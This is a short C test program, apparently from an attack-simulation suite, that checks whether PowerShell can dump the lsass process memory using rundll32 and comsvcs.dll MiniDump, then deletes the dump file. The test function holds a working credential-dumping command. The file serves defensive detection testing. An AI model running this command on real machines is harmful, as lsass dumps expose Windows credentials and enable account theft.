/*
 NAME: b74ad239-2ddd-4b1e-b608-8397a43c7c54_windows.c
 QUESTION: Can PowerShell use comsvcs.dll to dump lsass?
 CREATED: 2022-09-19
 */
#include <stdlib.h>

void test(void)
{
    char *command = "powershell.exe -c ""try { rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (get-process lsass).id $env:temp\\lsass.dump full; start-sleep 5; if (test-path $env:temp\\lsass.dump) { exit(100); } else { exit(101); } } catch { exit(1); }""";
    int ret = system(command);
    exit(ret);
}

void clean(void)
{
    char *command = "powershell.exe -c ""try { if (test-path $env:temp\\lsass.dump) { rm $env:temp\\lsass.dump; exit(100); } else { echo ""File not found: $env:temp\\lsass.dump"" exit(3); } } catch { exit(104); }""";
    int ret = system(command);
    exit(ret);
}

int main(int argc, char *argv[])
{
    if (argc > 1) {
        clean();
    } else {
        test();
    }
}